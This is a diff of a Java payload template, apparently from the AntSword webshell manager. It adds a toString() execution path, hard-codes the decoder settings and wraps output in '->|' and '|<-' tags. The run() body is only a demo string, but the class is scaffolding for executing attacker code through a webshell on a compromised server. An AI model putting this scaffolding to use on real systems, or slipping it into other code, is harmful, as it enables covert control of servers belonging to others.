@@ -5,47 +5,56 @@ import java.lang.reflect.Field;
 public class Template {
     public Object request;
     public Object response;
-    public String encoder;
-    public String cs;
-    public String randomPrefix;
+    public String encoder = "base64";
+    public String cs = "antswordCharset";
+    public String randomPrefix = "antswordrandomPrefix";
     public String decoderClassdata;
-    public String tag_s;
-    public String tag_e;
+    public String tag_s = "->|";
+    public String tag_e = "|<-";
+    public String varkeydecoder = "antswordargdecoder";
+    public String output = "";
 
     @Override
     public boolean equals(Object obj) {
-        encoder = "base64";
-        cs = "antswordCharset";
-        randomPrefix = "antswordrandomPrefix";
-        tag_s = "->|";
-        tag_e = "|<-";
-        this.parseObj(obj);
-        StringBuffer output = new StringBuffer();
 
-        String varkeydecoder = "antswordargdecoder";
         try {
+            this.decoderClassdata = new String(this.Base64DecodeToByte(varkeydecoder), this.cs);
+            output += run();
+            output = this.asoutput(output);
+        } catch (Exception e) {
+            output += "ERROR:// " + e;
+        }
+
+        try {
+            this.parseObj(obj);
             response.getClass().getMethod("setContentType", String.class).invoke(response, "text/html");
             request.getClass().getMethod("setCharacterEncoding", String.class).invoke(request, cs);
             response.getClass().getMethod("setCharacterEncoding", String.class).invoke(response, cs);
-            this.decoderClassdata = getParam(varkeydecoder);
-            output.append(run());
-        } catch (Exception e) {
-            output.append("ERROR:// " + e);
-        }
-        try {
             Object writer = response.getClass().getMethod("getWriter").invoke(response);
-            writer.getClass().getMethod("print", String.class).invoke(writer, tag_s + this.asoutput(output.toString()) + tag_e);
+            writer.getClass().getMethod("print", String.class).invoke(writer, tag_s + output + tag_e);
         } catch (Exception ignored) {
+            output = tag_s + output + tag_e;
         }
         return true;
     }
 
-    public String run() throws Exception {
-        return "This is a demo";
+    @Override
+    public String toString() {
+        if (output.isEmpty()) { // 防止重复执行
+            try {
+                this.decoderClassdata = new String(this.Base64DecodeToByte(varkeydecoder), this.cs);
+                output += run();
+                output = this.asoutput(output);
+            } catch (Exception e) {
+                output += "ERROR:// " + e;
+            }
+            output = tag_s + output + tag_e;
+        }
+        return output;
     }
 
-    public String getParam(String key) throws Exception {
-        return decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, key));
+    public String run() throws Exception {
+        return "This is a demo";
     }
 
     public void parseObj(Object obj) {
